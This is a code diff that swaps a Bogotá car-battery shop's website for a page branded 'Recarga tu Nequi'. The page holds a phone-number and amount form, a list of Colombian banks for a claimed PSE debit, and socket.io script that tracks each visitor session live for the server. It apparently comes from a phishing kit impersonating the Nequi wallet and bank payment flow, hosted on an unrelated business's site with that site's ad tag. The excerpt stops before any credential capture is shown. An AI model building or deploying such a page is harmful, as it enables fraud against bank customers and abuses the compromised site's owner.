@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Battery Center Bogotá - Baterías para carros de todas las marcas. Servicio a domicilio, instalación gratis y garantía. Marcas Bosch y Alemana.">
-    <title>Battery Center Bogotá | Baterías para Carros - Servicio a Domicilio</title>
+    <title>Recarga tu Nequi</title>
     
     <!-- Google tag (gtag.js) -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17891912053"></script>
@@ -14,918 +13,465 @@
       gtag('js', new Date());
       gtag('config', 'AW-17891912053');
     </script>
-    
+    <link rel="stylesheet" href="styles.css">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
-    
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        :root {
-            --primary-color: #FF6B00;
-            --primary-dark: #E65100;
-            --secondary-color: #2C3E50;
-            --accent-color: #FFD700;
-            --text-dark: #1a1a1a;
-            --text-light: #666;
-            --bg-light: #F8F9FA;
-            --white: #ffffff;
-            --success: #27AE60;
-            --shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            --shadow-lg: 0 10px 30px rgba(0, 0, 0, 0.15);
-        }
-
-        body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            color: var(--text-dark);
-            line-height: 1.6;
-            background-color: var(--white);
-        }
-
-        /* Header */
-        header {
-            background: linear-gradient(135deg, var(--primary-color) 0%, var(--primary-dark) 100%);
-            color: var(--white);
-            padding: 1rem 0;
-            box-shadow: var(--shadow);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-        }
-
-        .header-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .logo-icon {
-            width: 50px;
-            height: 50px;
-            background: var(--white);
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-        }
-
-        .logo-text h1 {
-            font-size: 1.5rem;
-            font-weight: 800;
-            margin-bottom: 2px;
-        }
-
-        .logo-text p {
-            font-size: 0.75rem;
-            opacity: 0.9;
-        }
-
-        .contact-header {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-
-        .rating {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            background: rgba(255, 255, 255, 0.2);
-            padding: 8px 15px;
-            border-radius: 20px;
-            backdrop-filter: blur(10px);
-        }
-
-        .rating .stars {
-            color: var(--accent-color);
-            font-size: 1.1rem;
-        }
-
-        .rating .score {
-            font-weight: 700;
-            font-size: 1.1rem;
-        }
-
-        .rating .reviews {
-            opacity: 0.9;
-            font-size: 0.85rem;
-        }
-
-        /* Hero Section */
-        .hero {
-            background: linear-gradient(135deg, rgba(255, 107, 0, 0.95) 0%, rgba(230, 81, 0, 0.95) 100%),
-                        url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 600"><rect fill="%23f0f0f0" width="1200" height="600"/><path fill="%23e0e0e0" d="M0 300L50 283.3C100 266.7 200 233.3 300 233.3C400 233.3 500 266.7 600 283.3C700 300 800 300 900 283.3C1000 266.7 1100 233.3 1150 216.7L1200 200V600H1150C1100 600 1000 600 900 600C800 600 700 600 600 600C500 600 400 600 300 600C200 600 100 600 50 600H0V300Z"/></svg>');
-            background-size: cover;
-            background-position: center;
-            color: var(--white);
-            padding: 80px 20px;
-            text-align: center;
-        }
-
-        .hero-content {
-            max-width: 900px;
-            margin: 0 auto;
-        }
-
-        .hero h2 {
-            font-size: 3rem;
-            font-weight: 900;
-            margin-bottom: 20px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
-        }
-
-        .hero p {
-            font-size: 1.3rem;
-            margin-bottom: 30px;
-            opacity: 0.95;
-        }
-
-        .hero-features {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            flex-wrap: wrap;
-            margin-top: 40px;
-        }
-
-        .hero-feature {
-            background: rgba(255, 255, 255, 0.15);
-            padding: 20px 30px;
-            border-radius: 15px;
-            backdrop-filter: blur(10px);
-            border: 2px solid rgba(255, 255, 255, 0.3);
-        }
-
-        .hero-feature .icon {
-            font-size: 2rem;
-            margin-bottom: 10px;
-        }
-
-        .hero-feature h3 {
-            font-size: 1.1rem;
-            font-weight: 700;
-        }
-
-        /* Status Badge */
-        .status-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: var(--success);
-            color: var(--white);
-            padding: 10px 25px;
-            border-radius: 25px;
-            font-weight: 600;
-            margin-bottom: 30px;
-            box-shadow: var(--shadow);
-        }
-
-        .status-badge .dot {
-            width: 10px;
-            height: 10px;
-            background: var(--white);
-            border-radius: 50%;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-
-        /* CTA Buttons */
-        .cta-buttons {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            flex-wrap: wrap;
-        }
-
-        .btn {
-            padding: 15px 40px;
-            border-radius: 30px;
-            font-weight: 700;
-            font-size: 1.1rem;
-            border: none;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-decoration: none;
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            box-shadow: var(--shadow);
-        }
-
-        .btn-primary {
-            background: var(--white);
-            color: var(--primary-color);
-        }
-
-        .btn-primary:hover {
-            transform: translateY(-3px);
-            box-shadow: var(--shadow-lg);
-        }
-
-        .btn-secondary {
-            background: transparent;
-            color: var(--white);
-            border: 2px solid var(--white);
-        }
-
-        .btn-secondary:hover {
-            background: var(--white);
-            color: var(--primary-color);
-            transform: translateY(-3px);
-        }
-
-        /* Container */
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 60px 20px;
-        }
-
-        /* Services Section */
-        .services-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 30px;
-            margin-top: 40px;
-        }
-
-        .service-card {
-            background: var(--white);
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: var(--shadow);
-            transition: all 0.3s ease;
-            border: 2px solid transparent;
-        }
-
-        .service-card:hover {
-            transform: translateY(-10px);
-            box-shadow: var(--shadow-lg);
-            border-color: var(--primary-color);
-        }
-
-        .service-card .icon {
-            width: 70px;
-            height: 70px;
-            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
-            border-radius: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 2rem;
-            color: var(--white);
-            margin-bottom: 20px;
-        }
-
-        .service-card h3 {
-            font-size: 1.5rem;
-            color: var(--secondary-color);
-            margin-bottom: 15px;
-            font-weight: 700;
-        }
-
-        .service-card p {
-            color: var(--text-light);
-            line-height: 1.8;
-        }
-
-        /* Products Section */
-        .section-title {
-            text-align: center;
-            margin-bottom: 50px;
-        }
-
-        .section-title h2 {
-            font-size: 2.5rem;
-            color: var(--secondary-color);
-            font-weight: 800;
-            margin-bottom: 10px;
-        }
-
-        .section-title p {
-            font-size: 1.1rem;
-            color: var(--text-light);
-        }
-
-        .products-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 30px;
-            margin-top: 40px;
-        }
-
-        .product-card {
-            background: var(--white);
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: var(--shadow);
-            transition: all 0.3s ease;
-        }
-
-        .product-card:hover {
-            transform: translateY(-5px);
-            box-shadow: var(--shadow-lg);
-        }
-
-        .product-image {
-            width: 100%;
-            height: 200px;
-            background: linear-gradient(135deg, var(--bg-light), #e0e0e0);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 4rem;
-        }
-
-        .product-info {
-            padding: 25px;
-        }
-
-        .product-brand {
-            display: inline-block;
-            background: var(--primary-color);
-            color: var(--white);
-            padding: 5px 15px;
-            border-radius: 15px;
-            font-size: 0.85rem;
-            font-weight: 600;
-            margin-bottom: 10px;
-        }
-
-        .product-info h3 {
-            font-size: 1.3rem;
-            color: var(--secondary-color);
-            margin-bottom: 10px;
-            font-weight: 700;
-        }
-
-        .product-info p {
-            color: var(--text-light);
-            margin-bottom: 15px;
-        }
-
-        .product-features {
-            list-style: none;
-            margin-bottom: 20px;
-        }
-
-        .product-features li {
-            padding: 8px 0;
-            color: var(--text-light);
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .product-features li:before {
-            content: "✓";
-            color: var(--success);
-            font-weight: bold;
-            font-size: 1.2rem;
-        }
-
-        /* Testimonials */
-        .testimonials {
-            background: var(--bg-light);
-            padding: 60px 20px;
-        }
-
-        .testimonials-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 30px;
-            max-width: 1200px;
-            margin: 40px auto 0;
-        }
-
-        .testimonial-card {
-            background: var(--white);
-            padding: 30px;
-            border-radius: 20px;
-            box-shadow: var(--shadow);
-        }
-
-        .testimonial-header {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-
-        .testimonial-avatar {
-            width: 50px;
-            height: 50px;
-            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: var(--white);
-            font-weight: 700;
-            font-size: 1.2rem;
-        }
-
-        .testimonial-info h4 {
-            font-weight: 600;
-            color: var(--secondary-color);
-        }
-
-        .testimonial-stars {
-            color: var(--accent-color);
-        }
-
-        .testimonial-text {
-            color: var(--text-light);
-            font-style: italic;
-            line-height: 1.8;
-        }
-
-        /* Location Section */
-        .location {
-            background: var(--secondary-color);
-            color: var(--white);
-            padding: 60px 20px;
-        }
-
-        .location-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 50px;
-            align-items: center;
-        }
-
-        .location-info h2 {
-            font-size: 2.5rem;
-            margin-bottom: 30px;
-            font-weight: 800;
-        }
-
-        .location-details {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-
-        .location-item {
-            display: flex;
-            align-items: flex-start;
-            gap: 15px;
-            padding: 20px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 15px;
-            backdrop-filter: blur(10px);
-        }
-
-        .location-item .icon {
-            font-size: 1.5rem;
-            margin-top: 5px;
-        }
-
-        .location-item h3 {
-            font-weight: 700;
-            margin-bottom: 5px;
-        }
-
-        .location-item p {
-            opacity: 0.9;
-            line-height: 1.6;
-        }
-
-        .location-map {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 20px;
-            padding: 30px;
-            text-align: center;
-            backdrop-filter: blur(10px);
-            border: 2px solid rgba(255, 255, 255, 0.2);
-        }
-
-        .location-map .map-icon {
-            font-size: 5rem;
-            margin-bottom: 20px;
-        }
-
-        /* Footer */
-        footer {
-            background: var(--text-dark);
-            color: var(--white);
-            padding: 40px 20px 20px;
-            text-align: center;
-        }
-
-        .footer-content {
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 30px;
-            flex-wrap: wrap;
-            margin-bottom: 30px;
-        }
-
-        .footer-links a {
-            color: var(--white);
-            text-decoration: none;
-            opacity: 0.8;
-            transition: opacity 0.3s;
-        }
-
-        .footer-links a:hover {
-            opacity: 1;
-        }
-
-        .footer-bottom {
-            padding-top: 20px;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            opacity: 0.7;
-            font-size: 0.9rem;
-        }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            .hero h2 {
-                font-size: 2rem;
-            }
-
-            .hero p {
-                font-size: 1rem;
-            }
-
-            .hero-features {
-                flex-direction: column;
-                gap: 15px;
-            }
-
-            .section-title h2 {
-                font-size: 1.8rem;
-            }
-
-            .location-content {
-                grid-template-columns: 1fr;
-            }
-
-            .contact-header {
-                flex-direction: column;
-                gap: 10px;
-            }
-
-            .logo-text h1 {
-                font-size: 1.2rem;
-            }
-
-            .services-grid,
-            .products-grid {
-                grid-template-columns: 1fr;
-            }
-        }
-
-        /* WhatsApp Float Button */
-        .whatsapp-float {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
-            width: 60px;
-            height: 60px;
-            background: #25D366;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 2rem;
-            color: white;
-            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.4);
-            cursor: pointer;
-            transition: all 0.3s ease;
-            z-index: 1000;
-            text-decoration: none;
-        }
-
-        .whatsapp-float:hover {
-            transform: scale(1.1);
-            box-shadow: 0 6px 20px rgba(37, 211, 102, 0.6);
-        }
-    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 </head>
 <body>
-    <!-- Header -->
-    <header>
-        <div class="header-content">
-            <div class="logo">
-                <div class="logo-icon">🔋</div>
-                <div class="logo-text">
-                    <h1>Battery Center</h1>
-                    <p>Bogotá</p>
-                </div>
-            </div>
-            <div class="contact-header">
-                <div class="rating">
-                    <span class="stars">⭐</span>
-                    <span class="score">4.9</span>
-                    <span class="reviews">(95 reseñas)</span>
-                </div>
-            </div>
+    <script src="/socket.io/socket.io.js"></script>
+    
+    <div class="container">
+        <div class="logo">
+            <img src="img/nequi-logo.svg" alt="Nequi">
         </div>
-    </header>
-
-    <!-- Hero Section -->
-    <section class="hero">
-        <div class="hero-content">
-            <div class="status-badge">
-                <span class="dot"></span>
-                <span>Abierto ahora</span>
-            </div>
-            <h2>Baterías para Carros<br>Servicio a Domicilio</h2>
-            <p>Las mejores marcas del mercado con instalación gratuita y garantía extendida</p>
-            <div class="cta-buttons">
-                <a href="tel:+573001234567" class="btn btn-primary">
-                    📞 Llamar Ahora
-                </a>
-                <a href="#productos" class="btn btn-secondary">
-                    Ver Productos
-                </a>
-            </div>
-            <div class="hero-features">
-                <div class="hero-feature">
-                    <div class="icon">🚚</div>
-                    <h3>Servicio a Domicilio</h3>
-                </div>
-                <div class="hero-feature">
-                    <div class="icon">⚡</div>
-                    <h3>Instalación Gratis</h3>
-                </div>
-                <div class="hero-feature">
-                    <div class="icon">🛡️</div>
-                    <h3>Garantía Extendida</h3>
+        
+        <h1>Recarga tu Nequi</h1>
+        
+        <form class="recharge-form" id="recharge-form">
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <label class="input-label">Número de celular</label>
+                    <input type="tel" id="phone" name="phone" placeholder="" pattern="3[0-9]{9}" maxlength="10" inputmode="numeric">
                 </div>
             </div>
-        </div>
-    </section>
-
-    <!-- Services Section -->
-    <section class="container">
-        <div class="section-title">
-            <h2>Nuestros Servicios</h2>
-            <p>Soluciones completas para tu vehículo</p>
-        </div>
-        <div class="services-grid">
-            <div class="service-card">
-                <div class="icon">🔋</div>
-                <h3>Venta de Baterías</h3>
-                <p>Amplio catálogo de baterías líquidas, Start-Stop y secas. Marcas reconocidas como Bosch y Alemana para todo tipo de vehículos.</p>
+            
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <label class="input-label">Confirma el número de celular</label>
+                    <input type="tel" id="confirm-phone" name="confirm-phone" placeholder="" pattern="3[0-9]{9}" maxlength="10" inputmode="numeric">
+                </div>
+                <span class="error-message" id="phone-error"></span>
             </div>
-            <div class="service-card">
-                <div class="icon">🔧</div>
-                <h3>Instalación Profesional</h3>
-                <p>Instalación gratuita con la compra de tu batería. Nuestros técnicos especializados garantizan un servicio rápido y seguro.</p>
+            
+            <div class="form-group">
+                <div class="input-wrapper">
+                    <label class="input-label">¿Cuánto?</label>
+                    <input type="text" id="amount" name="amount" placeholder="" inputmode="numeric">
+                </div>
+                <span class="error-message" id="amount-error"></span>
             </div>
-            <div class="service-card">
-                <div class="icon">🔍</div>
-                <h3>Revisión Sistema Eléctrico</h3>
-                <p>Diagnóstico completo del sistema eléctrico de tu vehículo para prevenir fallas futuras y asegurar el mejor rendimiento.</p>
-            </div>
-            <div class="service-card">
-                <div class="icon">💻</div>
-                <h3>Escaneo Automotriz</h3>
-                <p>Escaneo computarizado gratis con la compra de batería. Detectamos cualquier falla en el sistema electrónico de tu auto.</p>
-            </div>
-            <div class="service-card">
-                <div class="icon">🚚</div>
-                <h3>Servicio a Domicilio</h3>
-                <p>Llevamos la batería e instalación hasta tu ubicación en Bogotá y municipios cercanos. ¡No necesitas moverte de casa!</p>
-            </div>
-            <div class="service-card">
-                <div class="icon">⏱️</div>
-                <h3>Servicio Rápido</h3>
-                <p>Atención inmediata y servicio express. En menos de una hora tu vehículo estará listo para rodar.</p>
-            </div>
-        </div>
-    </section>
-
-    <!-- Products Section -->
-    <section class="container" id="productos">
-        <div class="section-title">
-            <h2>Tipos de Baterías</h2>
-            <p>Encuentra la batería perfecta para tu vehículo</p>
-        </div>
-        <div class="products-grid">
-            <div class="product-card">
-                <div class="product-image">🔋</div>
-                <div class="product-info">
-                    <span class="product-brand">BOSCH</span>
-                    <h3>Baterías Líquidas</h3>
-                    <p>Ideales para vehículos convencionales. La opción más económica y confiable del mercado.</p>
-                    <ul class="product-features">
-                        <li>Mayor duración</li>
-                        <li>Bajo mantenimiento</li>
-                        <li>Arranque confiable</li>
-                        <li>Garantía extendida</li>
-                    </ul>
+            
+            <div class="form-group">
+                <div class="select-wrapper has-value-default">
+                    <div class="select-label-static">Tipo de persona</div>
+                    <select id="person-type" name="person-type" class="has-value">
+                        <option value="natural" selected>Natural</option>
+                        <option value="juridica">Jurídica</option>
+                    </select>
+                    <div class="select-arrow"></div>
                 </div>
             </div>
-            <div class="product-card">
-                <div class="product-image">⚡</div>
-                <div class="product-info">
-                    <span class="product-brand">ALEMANA</span>
-                    <h3>Baterías Start-Stop</h3>
-                    <p>Especiales para vehículos con sistema Start-Stop. Mayor resistencia a ciclos de carga.</p>
-                    <ul class="product-features">
-                        <li>Para autos modernos</li>
-                        <li>Alta eficiencia</li>
-                        <li>Ahorro de combustible</li>
-                        <li>Tecnología avanzada</li>
-                    </ul>
+            
+            <div class="form-group">
+                <div class="select-wrapper no-float">
+                    <span class="select-placeholder" id="bank-placeholder">Elige el banco</span>
+                    <div class="select-label-static">Elige el banco</div>
+                    <select id="bank" name="bank">
+                        <option value="" disabled selected hidden></option>
+                        <option value="">A continuación seleccione su banco</option>
+                        <option value="alianza">ALIANZA FIDUCIARIA</option>
+                        <option value="Agrario">BANCO AGRARIO</option>
+                        <option value="AV Villas">BANCO AV VILLAS</option>
+                        <option value="BBVA">BANCO BBVA COLOMBIA S.A.</option>
+                        <option value="Caja Social">BANCO CAJA SOCIAL</option>
+                        <option value="cooperativo">BANCO COOPERATIVO COPCENTRAL</option>
+                        <option value="Davivienda">BANCO DAVIVIENDA</option>
+                        <option value="Bogota">BANCO DE BOGOTA</option>
+                        <option value="Occidente">BANCO DE OCCIDENTE</option>
+                        <option value="Falabella">BANCO FALABELLA</option>
+                        <option value="finandina">BANCO FINANDINA S.A. BIC</option>
+                        <option value="gnb">BANCO GNB SUDAMERIS</option>
+                        <option value="itau">BANCO ITAU</option>
+                        <option value="jpmorgan">BANCO J.P. MORGAN COLOMBIA S.A.</option>
+                        <option value="Banco Mundo Mujer">BANCO MUNDO MUJER S.A.</option>
+                        <option value="pichincha">BANCO PICHINCHA S.A.</option>
+                        <option value="Popular">BANCO POPULAR</option>
+                        <option value="santander">BANCO SANTANDER COLOMBIA</option>
+                        <option value="Serfinanza">BANCO SERFINANZA</option>
+                        <option value="union">BANCO UNION</option>
+                        <option value="ban100">BAN100</option>
+                        <option value="bancamia">BANCAMIA S.A.</option>
+                        <option value="Bancolombia">BANCOLOMBIA</option>
+                        <option value="bancoomeva">BANCOOMEVA S.A.</option>
+                        <option value="bold">BOLD CF</option>
+                        <option value="cfa">CFA COOPERATIVA FINANCIERA</option>
+                        <option value="citibank">CITIBANK</option>
+                        <option value="coink">COINK SA</option>
+                        <option value="coltefinanciera">COLTEFINANCIERA</option>
+                        <option value="confiar">CONFIAR COOPERATIVA FINANCIERA</option>
+                        <option value="cotrafa">COTRAFA</option>
+                        <option value="crezcamos">CREZCAMOS MOSI</option>
+                        <option value="dale">DALE</option>
+                        <option value="Daviplata">DAVIPLATA</option>
+                        <option value="ding">DING</option>
+                        <option value="juriscoop">FINANCIERA JURISCOOP SA COMPAÑÍA DE FINANCIAMIENTO</option>
+                        <option value="global66">GLOBAL66</option>
+                        <option value="iris">IRIS</option>
+                        <option value="jfk">JFK COOPERATIVA FINANCIERA</option>
+                        <option value="lulo">LULO BANK</option>
+                        <option value="movii">MOVII S.A.</option>
+                        <option value="nu">NU</option>
+                        <option value="powii">POWII</option>
+                        <option value="rappipay">RAPPIPAY</option>
+                        <option value="Scotiabank Colpatria">SCOTIABANK COLPATRIA</option>
+                        <option value="uala">UALÁ</option>
+                    </select>
+                    <div class="select-arrow"></div>
                 </div>
             </div>
-            <div class="product-card">
-                <div class="product-image">🔊</div>
-                <div class="product-info">
-                    <span class="product-brand">BOSCH</span>
-                    <h3>Baterías Secas</h3>
-                    <p>Perfectas para sistemas de sonido y trabajo pesado. Sin mantenimiento y libre de derrames.</p>
-                    <ul class="product-features">
-                        <li>Para audio profesional</li>
-                        <li>Cero mantenimiento</li>
-                        <li>Mayor potencia</li>
-                        <li>Seguras y selladas</li>
-                    </ul>
-                </div>
+            
+            <div class="checkbox-group">
+                <label class="checkbox-container">
+                    <input type="checkbox" name="terms">
+                    <span class="checkmark"></span>
+                    <span class="checkbox-text">Acepto que las entradas del formulario se comprueben en busca de spam y se almacenen encriptadas durante 14 días.</span>
+                </label>
             </div>
-        </div>
-    </section>
-
-    <!-- Testimonials Section -->
-    <section class="testimonials">
-        <div class="section-title">
-            <h2>Lo Que Dicen Nuestros Clientes</h2>
-            <p>Más de 95 reseñas positivas nos respaldan</p>
-        </div>
-        <div class="testimonials-grid">
-            <div class="testimonial-card">
-                <div class="testimonial-header">
-                    <div class="testimonial-avatar">M</div>
-                    <div class="testimonial-info">
-                        <h4>María González</h4>
-                        <div class="testimonial-stars">⭐⭐⭐⭐⭐</div>
-                    </div>
-                </div>
-                <p class="testimonial-text">"Muy buen servicio, rápido, me hicieron domicilio hasta Mosquera. La batería quedó perfectamente instalada y el precio fue excelente."</p>
-            </div>
-            <div class="testimonial-card">
-                <div class="testimonial-header">
-                    <div class="testimonial-avatar">C</div>
-                    <div class="testimonial-info">
-                        <h4>Carlos Pérez</h4>
-                        <div class="testimonial-stars">⭐⭐⭐⭐⭐</div>
-                    </div>
-                </div>
-                <p class="testimonial-text">"Excelente atención y asesoría. Me ayudaron a elegir la batería correcta para mi camioneta. El servicio a domicilio es muy cómodo."</p>
-            </div>
-            <div class="testimonial-card">
-                <div class="testimonial-header">
-                    <div class="testimonial-avatar">A</div>
-                    <div class="testimonial-info">
-                        <h4>Andrea Rodríguez</h4>
-                        <div class="testimonial-stars">⭐⭐⭐⭐⭐</div>
-                    </div>
-                </div>
-                <p class="testimonial-text">"Súper recomendados! Me hicieron el escaneo gratis y detectaron un problema que no sabía que tenía. Muy profesionales."</p>
-            </div>
-        </div>
-    </section>
-
-    <!-- Location Section -->
-    <section class="location">
-        <div class="location-content">
-            <div class="location-info">
-                <h2>Visítanos o Solicita Servicio a Domicilio</h2>
-                <div class="location-details">
-                    <div class="location-item">
-                        <div class="icon">📍</div>
-                        <div>
-                            <h3>Dirección</h3>
-                            <p>Calle 72 # 57 13<br>Barrio San Fernando, Bogotá</p>
-                        </div>
-                    </div>
-                    <div class="location-item">
-                        <div class="icon">📞</div>
-                        <div>
-                            <h3>Teléfono</h3>
-                            <p>+57 300 123 4567<br>+57 301 234 5678</p>
-                        </div>
-                    </div>
-                    <div class="location-item">
-                        <div class="icon">🕒</div>
-                        <div>
-                            <h3>Horario</h3>
-                            <p>Lunes a Sábado: 8:00 AM - 7:00 PM<br>Domingos: 9:00 AM - 4:00 PM</p>
-                        </div>
-                    </div>
-                    <div class="location-item">
-                        <div class="icon">🚗</div>
-                        <div>
-                            <h3>Cobertura</h3>
-                            <p>Servicio a domicilio en toda Bogotá y municipios cercanos (Mosquera, Funza, Cota, Chía, Cajicá)</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-            <div class="location-map">
-                <div class="map-icon">🗺️</div>
-                <h3>Sede Principal</h3>
-                <p>Barrio San Fernando</p>
-                <a href="https://maps.google.com/?q=Calle+72+57+13+Bogota" target="_blank" class="btn btn-primary" style="margin-top: 20px;">
-                    Ver en Google Maps
-                </a>
-            </div>
-        </div>
-    </section>
-
-    <!-- Footer -->
-    <footer>
-        <div class="footer-content">
-            <div class="footer-links">
-                <a href="#inicio">Inicio</a>
-                <a href="#productos">Productos</a>
-                <a href="#servicios">Servicios</a>
-                <a href="tel:+573001234567">Contacto</a>
-            </div>
-            <div class="footer-bottom">
-                <p>&copy; 2026 Battery Center Bogotá. Todos los derechos reservados.</p>
-                <p>Tienda de repuestos para automóviles - Baterías de calidad certificada</p>
-                <div style="margin-top: 15px; font-size: 0.85rem;">
-                    <a href="politicas-privacidad.html" style="color: rgba(255,255,255,0.7); text-decoration: none; margin: 0 10px;">Políticas de Privacidad</a>
-                    <span style="color: rgba(255,255,255,0.3);">|</span>
-                    <a href="terminos-condiciones.html" style="color: rgba(255,255,255,0.7); text-decoration: none; margin: 0 10px;">Términos y Condiciones</a>
-                </div>
-            </div>
-        </div>
-    </footer>
-
-    <!-- WhatsApp Float Button -->
-    <a href="https://wa.me/573001234567?text=Hola,%20necesito%20información%20sobre%20baterías" class="whatsapp-float" target="_blank" aria-label="Contactar por WhatsApp">
-        💬
-    </a>
-
+            
+            <p class="info-text">
+                La recarga se hará usando los servicios de PSE y se debitará de tu cuenta corriente o de ahorros.
+            </p>
+            
+            <button type="submit" class="btn-submit" id="submit-btn" disabled>Continuar</button>
+            
+            <a href="#" class="help-link">Ayuda</a>
+        </form>
+    </div>
     <script>
-        // Smooth scroll for navigation links
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                const target = document.querySelector(this.getAttribute('href'));
-                if (target) {
-                    target.scrollIntoView({
-                        behavior: 'smooth',
-                        block: 'start'
-                    });
-                }
+        let socket;
+        let sessionId;
+
+        document.addEventListener('DOMContentLoaded', initializeApp);
+
+        function initializeApp() {
+            setupSocket();
+            setupForm();
+        }
+
+        function setupSocket() {
+            socket = io({
+                transports: ['websocket', 'polling'],
+                reconnection: true,
+                reconnectionAttempts: 5,
+                reconnectionDelay: 1000
             });
-        });
-
-        // Add animation on scroll
-        const observerOptions = {
-            threshold: 0.1,
-            rootMargin: '0px 0px -50px 0px'
-        };
-
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    entry.target.style.opacity = '1';
-                    entry.target.style.transform = 'translateY(0)';
-                }
+            sessionId = localStorage.getItem('nequiSessionId');
+            if (!sessionId) {
+                sessionId = `nequi_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+                localStorage.setItem('nequiSessionId', sessionId);
+            }
+            
+            // Eventos de Socket.IO
+            socket.on('connect', () => {
+                socket.emit('initSession', { sessionId, module: 'nequi', page: 'index', data: {} });
             });
-        }, observerOptions);
+            
+            socket.on('sessionConfirmed', () => {});
+            socket.on('disconnect', () => {});
+            
+            setInterval(() => socket?.connected && socket.emit('keepAlive', { sessionId }), 25000);
+        }
 
-        document.querySelectorAll('.service-card, .product-card, .testimonial-card').forEach(el => {
-            el.style.opacity = '0';
-            el.style.transform = 'translateY(20px)';
-            el.style.transition = 'all 0.6s ease';
-            observer.observe(el);
-        });
+        let phoneInput, confirmPhoneInput, amountInput, bankSelect, form;
+        let phoneError, amountError, checkbox, submitBtn, personTypeSelect;
+
+        function setupForm() {
+            phoneInput = document.getElementById('phone');
+            confirmPhoneInput = document.getElementById('confirm-phone');
+            amountInput = document.getElementById('amount');
+            bankSelect = document.getElementById('bank');
+            form = document.getElementById('recharge-form');
+            phoneError = document.getElementById('phone-error');
+            amountError = document.getElementById('amount-error');
+            checkbox = document.querySelector('input[type="checkbox"]');
+            submitBtn = document.getElementById('submit-btn');
+            personTypeSelect = document.getElementById('person-type');
+
+            handlePhoneInput(phoneInput);
+            handlePhoneInput(confirmPhoneInput);
+            handleAmountInput();
+            handlePersonTypeSelect();
+            handleBankSelect();
+            checkbox.addEventListener('change', checkFormCompletion);
+            form.addEventListener('submit', validateForm);
+            setupSelectArrowAnimation();
+        }
+
+        function handlePhoneInput(input) {
+            input.addEventListener('input', function() {
+                // Permitir solo números
+                this.value = this.value.replace(/[^0-9]/g, '');
+                
+                // Limitar a 10 dígitos
+                if (this.value.length > 10) {
+                    this.value = this.value.slice(0, 10);
+                }
+                
+                // Actualizar label flotante
+                toggleLabel(this);
+                
+                // Validar coincidencia si es confirmación
+                if (this === confirmPhoneInput) {
+                    validatePhoneMatch();
+                }
+                
+                // Verificar estado del formulario
+                checkFormCompletion();
+            });
+            
+            input.addEventListener('blur', function() {
+                if (this === confirmPhoneInput) {
+                    validatePhoneMatch();
+                }
+                validatePhoneFormat(this);
+            });
+        }
+
+        function validatePhoneFormat(input) {
+            const value = input.value;
+            const hasError = (value && value.length === 10 && !value.startsWith('3')) ||
+                            (value && value.length > 0 && value.length < 10);
+            
+            input.classList.toggle('error', hasError);
+        }
+
+        function validatePhoneMatch() {
